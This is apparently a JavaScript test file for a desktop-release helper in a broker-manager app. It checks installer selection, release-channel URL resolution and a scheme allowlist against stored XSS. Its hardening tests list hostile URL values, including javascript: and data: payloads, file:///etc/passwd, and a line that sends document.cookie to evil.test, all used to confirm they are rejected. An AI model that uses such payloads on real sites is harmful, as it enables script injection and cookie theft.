import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  RELEASE_CHANNEL_UNAVAILABLE_MESSAGE,
  fetchLatestDesktopInstaller,
  getReleaseApiUrl,
  isReleaseChannelConfigured,
  resolveReleaseChannel,
  resolveReleasesPageUrl,
  selectDesktopInstallerAsset,
} from './desktopRelease.js';

test('selectDesktopInstallerAsset picks the installer from the latest release assets', () => {
  const installer = selectDesktopInstallerAsset({
    tag_name: 'v1.0.7',
    assets: [
      { name: 'latest.yml', browser_download_url: 'https://example.test/latest.yml' },
      { name: 'Broker-Manager-Setup-1.0.7.exe.blockmap', browser_download_url: 'https://example.test/app.blockmap' },
      { name: 'Broker-Manager-Setup-1.0.7.exe', browser_download_url: 'https://example.test/app.exe' },
    ],
  });

  assert.deepEqual(installer, {
    name: 'Broker-Manager-Setup-1.0.7.exe',
    url: 'https://example.test/app.exe',
    version: '1.0.7',
    publishedAt: '',
  });
});

test('selectDesktopInstallerAsset fails when release has no installer asset', () => {
  assert.throws(
    () => selectDesktopInstallerAsset({ tag_name: 'v1.0.7', assets: [] }),
    /Latest desktop installer is not available yet/
  );
});

test('resolveReleaseChannel returns the configured channel', () => {
  assert.equal(
    resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: 'https://releases.example.test/api/latest' }),
    'https://releases.example.test/api/latest'
  );
  assert.equal(
    resolveReleaseChannel({ VITE_DESKTOP_RELEASE_API_URL: 'https://releases.example.test/vite/latest' }),
    'https://releases.example.test/vite/latest'
  );
  assert.equal(
    resolveReleaseChannel({ desktop_release_api_url: 'https://releases.example.test/broker/latest' }),
    'https://releases.example.test/broker/latest'
  );
  assert.equal(
    resolveReleaseChannel({ env: { DESKTOP_RELEASE_API_URL: 'https://releases.example.test/nested/latest' } }),
    'https://releases.example.test/nested/latest'
  );
});

test('resolveReleaseChannel returns null when no channel is configured', () => {
  assert.equal(resolveReleaseChannel({}), null);
  assert.equal(resolveReleaseChannel(null), null);
  assert.equal(resolveReleaseChannel(undefined), null);
  assert.equal(resolveReleaseChannel('https://releases.example.test/api/latest'), null);
  assert.equal(resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: '' }), null);
  assert.equal(resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: '   ' }), null);
  assert.equal(resolveReleaseChannel({ unrelated_key: 'https://releases.example.test/api/latest' }), null);
});

const withRuntimeChannel = async (url, fn) => {
  const key = '__RTX_RUNTIME_CONFIG__';
  const hadPrior = Object.prototype.hasOwnProperty.call(globalThis, key);
  const prior = globalThis[key];
  try {
    if (url === undefined) {
      delete globalThis[key];
    } else {
      globalThis[key] = { DESKTOP_RELEASE_API_URL: url };
    }
    await fn();
  } finally {
    if (hadPrior) {
      globalThis[key] = prior;
    } else {
      delete globalThis[key];
    }
  }
};

test('getReleaseApiUrl uses the runtime channel when present', async () => {
  await withRuntimeChannel('https://releases.example.test/runtime/latest', () => {
    assert.equal(getReleaseApiUrl(), 'https://releases.example.test/runtime/latest');
    assert.equal(isReleaseChannelConfigured(), true);
  });
});

test('getReleaseApiUrl returns null when absent and emits no vendor URL', async () => {
  await withRuntimeChannel(undefined, () => {
    const channel = getReleaseApiUrl();
    assert.equal(channel, null);
    assert.equal(isReleaseChannelConfigured(), false);
    assert.ok(!String(channel || '').includes('://'));
  });
});

test('getReleaseApiUrl prefers the broker-provided channel', async () => {
  await withRuntimeChannel('https://releases.example.test/runtime/latest', () => {
    assert.equal(
      getReleaseApiUrl({ desktop_release_api_url: 'https://releases.example.test/broker/latest' }),
      'https://releases.example.test/broker/latest'
    );
  });
});

test('fetchLatestDesktopInstaller skips the network when no channel is configured', async () => {
  await withRuntimeChannel(undefined, async () => {
    let calls = 0;
    const fetchImpl = async () => {
      calls += 1;
      return { ok: true, json: async () => ({}) };
    };
    await assert.rejects(
      fetchLatestDesktopInstaller({ fetchImpl, brokerInfo: null }),
      new RegExp(RELEASE_CHANNEL_UNAVAILABLE_MESSAGE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
    );
    assert.equal(calls, 0);
  });
});

test('fetchLatestDesktopInstaller queries the configured channel', async () => {
  await withRuntimeChannel('https://releases.example.test/runtime/latest', async () => {
    const seen = [];
    const fetchImpl = async (url, options = {}) => {
      seen.push({ url, options });
      return {
        ok: true,
        json: async () => ({
          tag_name: 'v2.0.0',
          assets: [
            { name: 'Broker-Manager-Setup-2.0.0.exe', browser_download_url: 'https://releases.example.test/app.exe' },
          ],
        }),
      };
    };
    const installer = await fetchLatestDesktopInstaller({ fetchImpl });
    assert.equal(seen.length, 1);
    assert.equal(seen[0].url, 'https://releases.example.test/runtime/latest');
    assert.equal(seen[0].options.headers.Accept, 'application/json');
    assert.equal(installer.version, '2.0.0');
  });
});

test('fetchLatestDesktopInstaller honors an explicit channel override', async () => {
  await withRuntimeChannel(undefined, async () => {
    const seen = [];
    const fetchImpl = async (url) => {
      seen.push(url);
      return {
        ok: true,
        json: async () => ({
          tag_name: 'v2.0.1',
          assets: [
            { name: 'Broker-Manager-Setup-2.0.1.exe', browser_download_url: 'https://releases.example.test/app.exe' },
          ],
        }),
      };
    };
    const installer = await fetchLatestDesktopInstaller({
      fetchImpl,
      releaseApiUrl: 'https://releases.example.test/explicit/latest',
    });
    assert.deepEqual(seen, ['https://releases.example.test/explicit/latest']);
    assert.equal(installer.version, '2.0.1');
  });
});

// URL scheme allowlist (stored-XSS hardening): only http(s) and relative URLs
// resolve; every other scheme is treated as unconfigured (null).
test('resolveReleaseChannel accepts http(s) and relative URLs', () => {
  assert.equal(
    resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: 'https://releases.example.test/api/latest' }),
    'https://releases.example.test/api/latest'
  );
  assert.equal(
    resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: 'http://releases.example.test/api/latest' }),
    'http://releases.example.test/api/latest'
  );
  assert.equal(
    resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: 'HTTPS://releases.example.test/api/latest' }),
    'HTTPS://releases.example.test/api/latest'
  );
  assert.equal(
    resolveReleaseChannel({ desktop_release_api_url: '/api/releases/latest' }),
    '/api/releases/latest'
  );
  assert.equal(
    resolveReleaseChannel({ desktop_release_api_url: 'api/releases/latest.json' }),
    'api/releases/latest.json'
  );
});

test('resolveReleaseChannel rejects non-http(s) schemes as unconfigured', () => {
  const bad = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    '  javascript:alert(1)  ',
    'data:text/html,<script>alert(1)</script>',
    'DATA:text/html,hello',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'blob:https://releases.example.test/abc',
    'ftp://releases.example.test/latest',
  ];
  for (const value of bad) {
    assert.equal(resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: value }), null, `rejects ${value}`);
    assert.equal(resolveReleaseChannel({ desktop_release_api_url: value }), null, `rejects broker ${value}`);
  }
  assert.equal(isReleaseChannelConfigured({ DESKTOP_RELEASE_API_URL: 'javascript:alert(1)' }), false);
});

test('resolveReleaseChannel rejects stored-click-XSS shaped channel values', () => {
  // Stored-click-XSS shape: an operator-stored channel that would execute on
  // click if rendered as <a href>. Must resolve to null so HelpCenter renders
  // the fallback span instead of a link.
  const xss = "javascript:fetch('https://evil.test?c='+document.cookie)";
  assert.equal(resolveReleaseChannel({ desktop_release_api_url: xss }), null);
  assert.equal(resolveReleaseChannel({ releaseApiUrl: xss }), null);
  assert.equal(resolveReleaseChannel({ DESKTOP_RELEASE_API_URL: xss }), null);
  assert.equal(
    resolveReleaseChannel({ desktop_release_api_url: 'data:text/html,<img src=x onerror=alert(1)>' }),
    null
  );
  // A disallowed first key is skipped; a later allowed key still resolves.
  assert.equal(
    resolveReleaseChannel({
      desktop_release_api_url: 'javascript:alert(1)',
      releaseApiUrl: 'https://releases.example.test/fallback/latest',
    }),
    'https://releases.example.test/fallback/latest'
  );
});

test('fetchLatestDesktopInstaller rejects a disallowed explicit channel without network', async () => {
  await withRuntimeChannel(undefined, async () => {
    let calls = 0;
    const fetchImpl = async () => {
      calls += 1;
      return { ok: true, json: async () => ({}) };
    };
    await assert.rejects(
      fetchLatestDesktopInstaller({ fetchImpl, releaseApiUrl: 'javascript:alert(1)' }),
      new RegExp(RELEASE_CHANNEL_UNAVAILABLE_MESSAGE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
    );
    assert.equal(calls, 0);
  });
});

test('fetchLatestDesktopInstaller rejects a disallowed broker channel without network', async () => {
  await withRuntimeChannel(undefined, async () => {
    let calls = 0;
    const fetchImpl = async () => {
      calls += 1;
      return { ok: true, json: async () => ({}) };
    };
    await assert.rejects(
      fetchLatestDesktopInstaller({
        fetchImpl,
        brokerInfo: { desktop_release_api_url: 'javascript:alert(1)' },
      }),
      new RegExp(RELEASE_CHANNEL_UNAVAILABLE_MESSAGE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
    );
    assert.equal(calls, 0);
  });
});

test('HelpCenter is valid UTF-8 with preserved glyphs (no latin1 dodge)', () => {
  // Adversarial HOLD 1: HelpCenter.jsx was invalid UTF-8 (6 single-byte
  // Win-1252 chars). It is now stored as UTF-8 with the same glyphs and CRLF
  // endings, so a plain utf8 read must succeed with no replacement chars.
  const helpSource = readFileSync(new URL('../components/HelpCenter.jsx', import.meta.url), 'utf8');
  assert.ok(!helpSource.includes('�'), 'no UTF-8 replacement characters');
  assert.ok(helpSource.includes('×'), 'multiplication sign preserved');
  assert.ok(helpSource.includes('…'), 'ellipsis preserved');
  assert.ok(helpSource.includes('·'), 'middle dot preserved');
  assert.ok(helpSource.includes('Close tabs with ×'), 'workspace copy intact');
  assert.ok(helpSource.includes('Checking for updates…'), 'update status copy intact');
  assert.ok(helpSource.includes('Search accounts, prices, workspace…'), 'search placeholder intact');
});

test('HelpCenter updater branch races with timeout and always resets busy', () => {
  const helpSource = readFileSync(new URL('../components/HelpCenter.jsx', import.meta.url), 'utf8');
  assert.ok(helpSource.includes('window.rtx5Updater?.checkForUpdates'), 'bridge branch stays intact');
  assert.ok(helpSource.includes('Promise.race'), 'bridge call races against a timeout');
  assert.ok(helpSource.includes('AbortSignal.timeout(15000)'), '15s timeout guards both branches');
  assert.ok(helpSource.includes('brokerInfo: getBrokerInfo()'), 'fallback fetch uses broker channel');
  assert.ok(helpSource.includes('finally'), 'busy is always reset');
  assert.ok(helpSource.includes('setBusy(false)'), 'finally resets busy');
});

test('HelpCenter labels the raw JSON channel honestly', () => {
  const helpSource = readFileSync(new URL('../components/HelpCenter.jsx', import.meta.url), 'utf8');
  // Documented choice (see HelpCenter.jsx comment): the channel is a JSON API
  // endpoint, not a human page, and no generic HTML mapping exists without
  // hardcoding vendor hosts (white-label rule). The channel link is therefore
  // labeled honestly; only the separately configured human notes page
  // (resolveReleasesPageUrl) may ever be labeled "View release notes".
  assert.ok(helpSource.includes('Query update channel'), 'honest label for the JSON channel');
  assert.ok(helpSource.includes('View release notes'), 'configured notes page is labeled as release notes');
  assert.ok(
    helpSource.includes('<a href={helpReleasesPageUrl}'),
    'release-notes label points at the notes-page URL, never the JSON channel'
  );
  assert.ok(
    helpSource.includes('<a href={helpReleaseChannelUrl}'),
    'channel link points at the channel URL with its honest label'
  );
  assert.ok(helpSource.includes('helpReleaseChannelUrl'), 'link renders only when a channel exists');
  assert.ok(
    helpSource.includes('JSON API endpoint'),
    'the derivation-vs-relabel choice is documented in code'
  );
});

test('HelpCenter shows View release notes only when a notes page is configured', () => {
  const helpSource = readFileSync(new URL('../components/HelpCenter.jsx', import.meta.url), 'utf8');
  assert.ok(helpSource.includes('resolveReleasesPageUrl'), 'notes-page URL is resolved from configuration');
  assert.ok(
    helpSource.includes('resolveReleasesPageUrl(getBrokerInfo())'),
    'notes page honors brokerInfo instead of runtime-only'
  );
  assert.ok(helpSource.includes('helpReleasesPageUrl'), 'notes link renders only when a notes page is configured');
  assert.ok(
    helpSource.includes('Release notes are available from your platform operator.'),
    'operator fallback stays intact when nothing is configured'
  );
});

test('DesktopAppDownloadButton passes brokerInfo with timeout and disables when unconfigured', () => {
  const buttonSource = readFileSync(new URL('../components/DesktopAppDownloadButton.jsx', import.meta.url), 'utf8');
  assert.ok(buttonSource.includes('getBrokerInfo()'), 'same broker-channel pattern as HelpCenter');
  assert.ok(buttonSource.includes('AbortSignal.timeout(15000)'), 'download never spins forever');
  assert.ok(
    buttonSource.includes('startLatestDesktopDownload({ signal: AbortSignal.timeout(15000), brokerInfo: getBrokerInfo() })'),
    'brokerInfo and timeout are passed together'
  );
  assert.ok(buttonSource.includes('isReleaseChannelConfigured'), 'unconfigured channel is detected');
  assert.ok(buttonSource.includes('RELEASE_CHANNEL_UNAVAILABLE_MESSAGE'), 'honest tooltip message reused');
  assert.ok(buttonSource.includes('aria-disabled'), 'disabled state is exposed accessibly');
});

test('fetchBrokerConfig merge preserves release-channel keys and country', async () => {
  const { fetchBrokerConfig } = await import('./brokerAuth.js');
  const { normalizeBrokerInfo } = await import('../config/backendTarget.js');

  // Discovery-list records already preserve the keys via passthrough.
  const passthrough = normalizeBrokerInfo({
    broker_id: 'demo',
    backend_url: 'https://backend.example.test',
    desktop_release_api_url: 'https://releases.example.test/broker/latest',
    country: 'Germany',
  });
  assert.equal(passthrough.desktop_release_api_url, 'https://releases.example.test/broker/latest');
  assert.equal(passthrough.country, 'Germany');

  // The /api/v2/broker/config merge must preserve them too (additive).
  const runtimeKey = '__RTX_RUNTIME_CONFIG__';
  const hadRuntime = Object.prototype.hasOwnProperty.call(globalThis, runtimeKey);
  const priorRuntime = globalThis[runtimeKey];
  const hadSession = Object.prototype.hasOwnProperty.call(globalThis, 'sessionStorage');
  const priorSession = globalThis.sessionStorage;
  const hadLocal = Object.prototype.hasOwnProperty.call(globalThis, 'localStorage');
  const priorLocal = globalThis.localStorage;
  const hadFetch = Object.prototype.hasOwnProperty.call(globalThis, 'fetch');
  const priorFetch = globalThis.fetch;
  const createStorage = () => {
    const store = new Map();
    return {
      getItem: (key) => (store.has(String(key)) ? store.get(String(key)) : null),
      setItem: (key, value) => store.set(String(key), String(value)),
      removeItem: (key) => store.delete(String(key)),
      clear: () => store.clear(),
    };
  };
  try {
    globalThis[runtimeKey] = { API_HOST: 'https://manager.example.test' };
    globalThis.sessionStorage = createStorage();
    globalThis.localStorage = createStorage();
    globalThis.sessionStorage.setItem(
      'broker_info',
      JSON.stringify({ broker_id: 'demo', backend_url: 'https://backend.example.test' })
    );
    const channelPayload = {
      broker_name: 'Demo',
      desktop_release_api_url: 'https://releases.example.test/config/latest',
      desktopReleaseApiUrl: 'https://releases.example.test/config/camel',
      release_api_url: 'https://releases.example.test/config/release',
      releaseApiUrl: 'https://releases.example.test/config/releaseCamel',
      DESKTOP_RELEASE_API_URL: 'https://releases.example.test/config/env',
      VITE_DESKTOP_RELEASE_API_URL: 'https://releases.example.test/config/vite',
      country: 'Germany',
      Country: 'Germany',
    };
    globalThis.fetch = async () => ({
      ok: true,
      text: async () => JSON.stringify(channelPayload),
    });
    const merged = await fetchBrokerConfig();
    assert.equal(merged.desktop_release_api_url, channelPayload.desktop_release_api_url);
    assert.equal(merged.desktopReleaseApiUrl, channelPayload.desktopReleaseApiUrl);
    assert.equal(merged.release_api_url, channelPayload.release_api_url);
    assert.equal(merged.releaseApiUrl, channelPayload.releaseApiUrl);
    assert.equal(merged.DESKTOP_RELEASE_API_URL, channelPayload.DESKTOP_RELEASE_API_URL);
    assert.equal(merged.VITE_DESKTOP_RELEASE_API_URL, channelPayload.VITE_DESKTOP_RELEASE_API_URL);
    assert.equal(merged.country, 'Germany');
  } finally {
    if (hadRuntime) globalThis[runtimeKey] = priorRuntime;
    else delete globalThis[runtimeKey];
    if (hadSession) globalThis.sessionStorage = priorSession;
    else delete globalThis.sessionStorage;
    if (hadLocal) globalThis.localStorage = priorLocal;
    else delete globalThis.localStorage;
    if (hadFetch) globalThis.fetch = priorFetch;
    else delete globalThis.fetch;
  }
});

test('release channel sources hardcode no external URLs and Help wiring stays intact', () => {
  const releaseSource = readFileSync(new URL('./desktopRelease.js', import.meta.url), 'utf8');
  assert.ok(!/https?:\/\//.test(releaseSource), 'desktopRelease must not hardcode an external URL');

  // HelpCenter.jsx is now valid UTF-8 (HOLD 1 fixed); read it as utf8.
  const helpSource = readFileSync(new URL('../components/HelpCenter.jsx', import.meta.url), 'utf8');
  assert.ok(!/https?:\/\//.test(helpSource), 'HelpCenter must not hardcode an external URL');
  assert.ok(helpSource.includes('Build version: {packageInfo.version}'), 'Help Updates version display stays intact');
  assert.ok(helpSource.includes('Version {packageInfo.version}'), 'Help About version display stays intact');
  assert.ok(helpSource.includes('getReleaseApiUrl'), 'HelpCenter resolves the channel from configuration');
  assert.ok(helpSource.includes('helpReleaseChannelUrl'), 'HelpCenter renders the link only when a channel exists');
});

test('resolveReleasesPageUrl resolves the notes page from direct config keys', () => {
  assert.equal(
    resolveReleasesPageUrl({ releasesUrl: 'https://notes.example.test/a' }),
    'https://notes.example.test/a'
  );
  assert.equal(
    resolveReleasesPageUrl({ desktopReleasesUrl: 'https://notes.example.test/b' }),
    'https://notes.example.test/b'
  );
  assert.equal(
    resolveReleasesPageUrl({ releaseNotesUrl: 'https://notes.example.test/c' }),
    'https://notes.example.test/c'
  );
  assert.equal(
    resolveReleasesPageUrl({ DESKTOP_RELEASES_URL: 'https://notes.example.test/d' }),
    'https://notes.example.test/d'
  );
  assert.equal(
    resolveReleasesPageUrl({ VITE_DESKTOP_RELEASES_URL: 'https://notes.example.test/e' }),
    'https://notes.example.test/e'
  );
  assert.equal(
    resolveReleasesPageUrl({ env: { DESKTOP_RELEASES_URL: 'https://notes.example.test/nested' } }),
    'https://notes.example.test/nested'
  );
  assert.equal(
    resolveReleasesPageUrl({ releasesUrl: '/releases/notes' }),
    '/releases/notes'
  );
});

test('resolveReleasesPageUrl resolves the notes page from the nested broker object', () => {
  assert.equal(
    resolveReleasesPageUrl({ broker: { desktopReleasesUrl: 'https://notes.example.test/broker' } }),
    'https://notes.example.test/broker'
  );
  assert.equal(
    resolveReleasesPageUrl({ broker: { releasesUrl: 'https://notes.example.test/broker-releases' } }),
    'https://notes.example.test/broker-releases'
  );
  assert.equal(
    resolveReleasesPageUrl({ broker: { releaseNotesUrl: 'https://notes.example.test/broker-notes' } }),
    'https://notes.example.test/broker-notes'
  );
  // Direct config wins over the nested broker object.
  assert.equal(
    resolveReleasesPageUrl({
      releasesUrl: 'https://notes.example.test/direct',
      broker: { releasesUrl: 'https://notes.example.test/broker' },
    }),
    'https://notes.example.test/direct'
  );
});

const withRuntimeNotesPage = async (url, fn) => {
  const key = '__RTX_RUNTIME_CONFIG__';
  const hadPrior = Object.prototype.hasOwnProperty.call(globalThis, key);
  const prior = globalThis[key];
  try {
    if (url === undefined) {
      delete globalThis[key];
    } else {
      globalThis[key] = { DESKTOP_RELEASES_URL: url };
    }
    await fn();
  } finally {
    if (hadPrior) {
      globalThis[key] = prior;
    } else {
      delete globalThis[key];
    }
  }
};

test('resolveReleasesPageUrl resolves the notes page from runtime config', async () => {
  await withRuntimeNotesPage('https://notes.example.test/runtime', () => {
    assert.equal(resolveReleasesPageUrl({}), 'https://notes.example.test/runtime');
    assert.equal(resolveReleasesPageUrl(null), 'https://notes.example.test/runtime');
    assert.equal(resolveReleasesPageUrl(undefined), 'https://notes.example.test/runtime');
  });
});

test('resolveReleasesPageUrl prefers config and broker sources over runtime', async () => {
  await withRuntimeNotesPage('https://notes.example.test/runtime', () => {
    assert.equal(
      resolveReleasesPageUrl({ releasesUrl: 'https://notes.example.test/direct' }),
      'https://notes.example.test/direct'
    );
    assert.equal(
      resolveReleasesPageUrl({ broker: { desktopReleasesUrl: 'https://notes.example.test/broker' } }),
      'https://notes.example.test/broker'
    );
  });
});

test('resolveReleasesPageUrl returns null when no notes page is configured', async () => {
  await withRuntimeNotesPage(undefined, () => {
    assert.equal(resolveReleasesPageUrl({}), null);
    assert.equal(resolveReleasesPageUrl(null), null);
    assert.equal(resolveReleasesPageUrl(undefined), null);
    assert.equal(resolveReleasesPageUrl('https://notes.example.test/x'), null);
    assert.equal(resolveReleasesPageUrl({ releasesUrl: '' }), null);
    assert.equal(resolveReleasesPageUrl({ releasesUrl: '   ' }), null);
    assert.equal(resolveReleasesPageUrl({ unrelated_key: 'https://notes.example.test/x' }), null);
    assert.equal(resolveReleasesPageUrl({ broker: {} }), null);
  });
});

test('resolveReleasesPageUrl rejects non-http(s) schemes as unconfigured', async () => {
  await withRuntimeNotesPage(undefined, () => {
    const bad = [
      'javascript:alert(1)',
      'JaVaScRiPt:alert(1)',
      '  javascript:alert(1)  ',
      'data:text/html,<script>alert(1)</script>',
      'DATA:text/html,hello',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://notes.example.test/abc',
      'ftp://notes.example.test/latest',
    ];
    for (const value of bad) {
      assert.equal(resolveReleasesPageUrl({ releasesUrl: value }), null, `rejects ${value}`);
      assert.equal(resolveReleasesPageUrl({ broker: { desktopReleasesUrl: value } }), null, `rejects broker ${value}`);
      assert.equal(resolveReleasesPageUrl({ DESKTOP_RELEASES_URL: value }), null, `rejects runtime-style ${value}`);
    }
    // A disallowed first key is skipped; a later allowed key still resolves.
    assert.equal(
      resolveReleasesPageUrl({
        releasesUrl: 'javascript:alert(1)',
        releaseNotesUrl: 'https://notes.example.test/fallback',
      }),
      'https://notes.example.test/fallback'
    );
  });
});

test('releases-page sources hardcode no external URLs and never use a vendor default', async () => {
  const releaseSource = readFileSync(new URL('./desktopRelease.js', import.meta.url), 'utf8');
  assert.ok(!/https?:\/\//.test(releaseSource), 'desktopRelease must not hardcode an external URL');
  await withRuntimeNotesPage(undefined, () => {
    const page = resolveReleasesPageUrl({});
    assert.equal(page, null);
    assert.ok(!String(page || '').includes('://'));
  });
});
